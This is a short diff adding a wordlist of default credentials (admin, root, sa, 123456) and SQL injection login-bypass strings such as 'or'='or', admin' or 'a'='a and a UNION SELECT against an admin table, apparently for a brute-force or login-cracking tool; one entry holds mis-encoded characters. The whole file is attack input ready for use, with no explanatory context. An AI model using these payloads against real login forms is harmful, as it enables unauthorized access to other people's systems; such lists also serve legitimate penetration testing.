@@ -1,0 +1,11 @@
+admin
+test
+123456
+root
+sa
+'or'='or'
+¡¯ or 1=1#
+ ' UNION Select 1,1,1 FROM admin Where ''=' 
+admin' or 'a'='a
+'or 1=1/*
+admin' or 1=1/*
